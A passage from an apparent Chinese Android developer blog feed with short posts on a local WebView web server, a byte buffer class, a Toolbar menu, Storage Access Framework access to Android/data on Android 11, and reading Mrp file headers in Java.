class="comment"></span></span><br><span class="line"><span class="comment">POST / HTTP/1.1</span></span><br><span class="line"><span class="comment">Host: 127.0.0.1:8080</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Content-Length: 10</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,* /*;q=0.8</span></span><br><span class="line"><span class="comment">Origin: null</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.1.1885384815.1467970825</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">name=value</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（注:* /*,为了避开注释的结束符，多加了一个空格）。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>folk\china\util\ByteBuffer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> folk.china.util;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可无限制增长的字节缓冲区</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wangchen11</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ByteBuffer</span> </span>&#123;</span><br><span class="line"> <span class="comment">//默认起始缓冲区长度</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_START_SIZE = <span class="number">64</span>;</span><br><span class="line"> <span class="comment">//默认每次增加缓冲区的长度</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_STEP_SIZE = <span class="number">512</span>; </span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">byte</span> []mBuffer = <span class="keyword">null</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">int</span> mPos = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">int</span> mStepSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">ByteBuffer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>(DEFAULT_START_SIZE);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">ByteBuffer</span><span class="params">(<span class="keyword">int</span> startSize)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>(startSize,DEFAULT_STEP_SIZE);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">ByteBuffer</span><span class="params">(<span class="keyword">int</span> startSize,<span class="keyword">int</span> stepSize)</span> </span>&#123;</span><br><span class="line">  setRealSize(startSize);</span><br><span class="line">  setStepSize(stepSize);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStepSize</span><span class="params">(<span class="keyword">int</span> stepSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(stepSize&lt;<span class="number">1</span>)</span><br><span class="line">   stepSize=<span class="number">1</span>;</span><br><span class="line">  mStepSize = stepSize;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">byte</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  checkSize(mPos+<span class="number">1</span>);</span><br><span class="line">  mBuffer[mPos]=data;</span><br><span class="line">  mPos++;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">byte</span> []data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  put(data,<span class="number">0</span>,data.length);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">byte</span> []data,<span class="keyword">int</span> offset,<span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  checkSize(mPos+count);</span><br><span class="line">  System.arraycopy(data, offset, mBuffer, mPos, count);</span><br><span class="line">  mPos+=count;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkSize</span><span class="params">(<span class="keyword">int</span> needSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(needSize&gt;mBuffer.length)</span><br><span class="line">  &#123;</span><br><span class="line">   setRealSize( needSize + mStepSize );</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setRealSize</span><span class="params">(<span class="keyword">int</span> realSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">byte</span> []tempBuffer = <span class="keyword">new</span> <span class="keyword">byte</span>[realSize];</span><br><span class="line">  <span class="keyword">if</span>(mBuffer!=<span class="keyword">null</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   System.arraycopy(mBuffer, <span class="number">0</span>, tempBuffer, <span class="number">0</span>, mPos);</span><br><span class="line">  &#125;</span><br><span class="line">  mBuffer = tempBuffer;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mPos = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> mPos;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">byte</span>[] getBytes()</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">return</span> mBuffer;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要加载assets中的网页时只需要</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Processor.WEB_ROOT = <span class="string">""</span>;</span><br><span class="line">WebServer server = <span class="keyword">new</span> WebServer();</span><br><span class="line">server.startServer(<span class="keyword">this</span>, <span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>在WebView中加载 <code>http://localhost:8080/index.html</code> 即可</p><p>若需要加载文件中的网页文件需要在 <code>Processor.java</code> 中将 <code>readAssetsFile()</code> 改到 <code>readFile()</code> ,将 <code>WEB_ROOT</code> 指定为网页路径即可</p><p>在高版本安卓上还要<a href="/2021/an-zhuo-yun-xu-http-wang-luo-qing-qiu/">开启允许Http访问</a></p><blockquote><p>上面方法来自<a href="https://github.com/fengdeyingzi/egretAndroid" target="_blank" rel="noopener">fengdeyingzi/egretAndroid</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓FTP程序</title>
      <link href="/2021/an-zhuo-ftp-cheng-xu/"/>
      <url>/2021/an-zhuo-ftp-cheng-xu/</url>
      
        <content type="html"><![CDATA[<p>分享一个简单的FTP软件，功能简单，只有核心功能  </p><a id="more"></a>  <p>图标：<img src="/img/preloader.gif" data-original="icon_ftp.png" alt><br>软件名：FTP服务<br>包名：cn.wangbin.myappftpassistant<br>大小：113.82K<br>下载：<a href="https://res.gddhy.net/apk/ftp.apk" target="_blank" rel="noopener">点击下载</a>  </p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Toolbar使用</title>
      <link href="/2021/toolbar-shi-yong/"/>
      <url>/2021/toolbar-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>在Toolbar中可以自定义按钮，和菜单一样使用res/menu  </p><a id="more"></a>  <p>当没有合适图片作为按钮是可以使用安卓中自带的一些图片，使用时as会有预览，可以直接选择</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:icon="@android:drawable/ic_menu_gallery"</span><br></pre></td></tr></table></figure><p>也可以直接将文本属性显示到Toolbar</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tools:ignore="HardcodedText"</span><br></pre></td></tr></table></figure><p>可以配合使用 <code>app:showAsAction</code> 的 <code>always</code> 显示、 <code>ifRoom</code> 若空间足够则显示、 <code>never</code> 隐藏  控制是否显示到Toolbar</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">menu</span></span></span><br><span class="line"><span class="tag"> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:icon</span>=<span class="string">"@android:drawable/ic_menu_gallery"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:title</span>=<span class="string">"图片按钮"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">app:showAsAction</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:title</span>=<span class="string">"文字按钮"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">app:showAsAction</span>=<span class="string">"ifRoom"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">tools:ignore</span>=<span class="string">"HardcodedText"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android11 无Root 访问data目录</title>
      <link href="/2021/android11-wu-root-fang-wen-data-mu-lu/"/>
      <url>/2021/android11-wu-root-fang-wen-data-mu-lu/</url>
      
        <content type="html"><![CDATA[<p>看到MT管理器、储存空间管理这些应用都能直接通过SAF框架来操作Android/data目录，安卓11谷歌在SAF选择目录时是不提供Android/data目录的，在CSDN找到了这个解决方法  </p><a id="more"></a>  <p>记录到自己的博客中，作为前面安卓储存权限适配的补充，以备后面需要  </p><p>通过SAF提供的DocumentFile操作文件会比File直接操作要慢</p><p>需要在 <code>build.gradle</code> 中添加引用</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">implementation</span> <span class="string">'androidx.documentfile:documentfile:1.0.1'</span></span><br></pre></td></tr></table></figure><p>下面直接贴代码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataFilesUtils</span> &#123;</span></span><br><span class="line"> <span class="comment">//直接获取data权限</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">startForRoot</span><span class="params">(Activity context, <span class="keyword">int</span> REQUEST_CODE_FOR_DIR)</span> </span>&#123;</span><br><span class="line">  Uri uri = Uri.parse(<span class="string">"content://com.android.externalstorage.documents/tree/primary%3AAndroid%2Fdata"</span>);</span><br><span class="line">  DocumentFile documentFile = DocumentFile.fromTreeUri(context, uri);</span><br><span class="line">  Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_OPEN_DOCUMENT_TREE);</span><br><span class="line">  intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION</span><br><span class="line">    | Intent.FLAG_GRANT_WRITE_URI_PERMISSION</span><br><span class="line">    | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span><br><span class="line">    | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);</span><br><span class="line">  intent.putExtra(DocumentsContract.EXTRA_INITIAL_URI, documentFile.getUri());</span><br><span class="line">  context.startActivityForResult(intent, REQUEST_CODE_FOR_DIR);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//在ActivityResult中保存权限</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">savePermission</span><span class="params">(Context context,Intent data)</span></span>&#123;</span><br><span class="line">  Uri uriTree = data.getData();</span><br><span class="line">  <span class="keyword">if</span>(uriTree == null)&#123;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">int</span> takeFlags = data.getFlags() &amp; (Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line">  context.getContentResolver().takePersistableUriPermission(uriTree, takeFlags);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//判断是否已经获取了Data权限，改改逻辑就能判断其他目录，懂得都懂</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isGrant</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (UriPermission persistedUriPermission : context.getContentResolver().getPersistedUriPermissions()) &#123;</span><br><span class="line">   <span class="keyword">if</span> (persistedUriPermission.isReadPermission() &amp;&amp; persistedUriPermission.getUri().toString().equals(<span class="string">"content://com.android.externalstorage.documents/tree/primary%3AAndroid%2Fdata"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//获取Android/data目录</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DocumentFile <span class="title">getDataFile</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line">  Uri uri = Uri.parse(<span class="string">"content://com.android.externalstorage.documents/tree/primary%3AAndroid%2Fdata"</span>);</span><br><span class="line">  <span class="keyword">return</span> DocumentFile.fromTreeUri(context, uri);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//根据路径获得document文件</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DocumentFile <span class="title">getDoucmentFile</span><span class="params">(Context context, <span class="keyword">String</span> path)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (path.endsWith(<span class="string">"/"</span>)) &#123;</span><br><span class="line">   path = path.substring(<span class="number">0</span>, path.length() - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">String</span> path2 = path.replace(<span class="string">"/storage/emulated/0/"</span>, <span class="string">""</span>).replace(<span class="string">"/"</span>, <span class="string">"%2F"</span>);</span><br><span class="line">  Uri uri = Uri.parse(<span class="string">"content://com.android.externalstorage.documents/tree/primary%3AAndroid%2Fdata/document/primary%3A"</span> + path2);</span><br><span class="line">  <span class="keyword">return</span> DocumentFile.fromSingleUri(context, uri);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>相关代码来自<a href="https://blog.csdn.net/qq_17827627/article/details/113931692" target="_blank" rel="noopener">Android11 无Root 访问data目录实现、Android11访问data目录、Android11解除data目录限制、Android11 data空白解决</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java获取Mrp信息</title>
      <link href="/2021/java-huo-qu-mrp-xin-xi/"/>
      <url>/2021/java-huo-qu-mrp-xin-xi/</url>
      
        <content type="html"><![CDATA[<p>最近用到的，代码来自 天使之翼 mrpoid</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> YYichou 2014-07-20 15:08:48</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MrpInfo</span> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> String label;</span><br><span class="line"> <span class="keyword">public</span> String name;</span><br><span class="line"> <span class="keyword">public</span> String vendor;</span><br><span class="line"> <span class="keyword">public</span> String detail;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">int</span> appid;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">int</span> version;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MrpUtils</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readMrpAppName</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">  RandomAccessFile raf = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">   raf = <span class="keyword">new</span> RandomAccessFile(path, <span class="string">"r"</span>);</span><br><span class="line">   <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">   raf.seek(<span class="number">28</span>);</span><br><span class="line">   raf.read(buf, <span class="number">0</span>, <span class="number">24</span>);</span><br><span class="line">   buf[<span class="number">24</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> String(buf, <span class="number">0</span>, <span class="number">24</span>, Charset.forName(<span class="string">"GB2312"</span>));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">   e.printStackTrace();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">    raf.close();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">byteArrayToInt</span><span class="params">(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> offset)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">   <span class="keyword">int</span> shift = (<span class="number">4</span> - <span class="number">1</span> - i) * <span class="number">8</span>;</span><br><span class="line">   value += (b[i + offset] &amp; <span class="number">0x000000FF</span>) &lt;&lt; shift;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> value;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> MrpInfo <span class="title">readMrpInfo</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">  MrpInfo mrpInfo = <span class="keyword">new</span> MrpInfo();</span><br><span class="line"></span><br><span class="line">  RandomAccessFile raf = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">   raf = <span class="keyword">new</span> RandomAccessFile(path, <span class="string">"r"</span>);</span><br><span class="line">   <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">final</span> Charset charset = Charset.forName(<span class="string">"GB2312"</span>);</span><br><span class="line"></span><br><span class="line">   raf.seek(<span class="number">28</span>);</span><br><span class="line">   raf.read(buf, <span class="number">0</span>, <span class="number">22</span>);</span><br><span class="line">   mrpInfo.label = <span class="keyword">new</span> String(buf, <span class="number">0</span>, <span class="number">22</span>, charset);</span><br><span class="line"></span><br><span class="line">   raf.seek(<span class="number">16</span>);</span><br><span class="line">   raf.read(buf, <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">   mrpInfo.name = <span class="keyword">new</span> String(buf, <span class="number">0</span>, <span class="number">12</span>, charset);</span><br><span class="line"></span><br><span class="line">   raf.seek(<span class="number">68</span>);</span><br><span class="line">   raf.read(buf, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">   mrpInfo.appid = Integer.reverseBytes(byteArrayToInt(buf, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">   raf.seek(<span class="number">72</span>);</span><br><span class="line">   raf.read(buf, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">   mrpInfo.version = Integer.reverseBytes(byteArrayToInt(buf, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">   raf.seek(<span class="number">88</span>);</span><br><span class="line">   raf.read(buf, <span class="number">0</span>, <span class="number">38</span>);</span><br><span class="line">   mrpInfo.vendor = <span class="keyword">new</span> String(buf, <span class="number">0</span>, <span class="number">38</span>, charset);</span><br><span class="line"></span><br><span class="line">   raf.seek(<span class="number">128</span>);</span><br><span class="line">   raf.read(buf, <span class="number">0</span>, <span class="number">60</span>);</span><br><span class="line">   mrpInfo.detail = <span class="keyword">new</span> String(buf, <span class="number">0</span>, <span class="number">60</span>, charset);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">   e.printStackTrace();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">    raf.close();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mrpInfo;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打开系统隐藏的文档应用</title>
      <link href="/2021/da-kai-xi-tong-yin-cang-de-wen-dang-ying-yong/"/>
      <url>/2021/da-kai-xi-tong-yin-cang-de-wen-dang-ying-yong/</url>
      
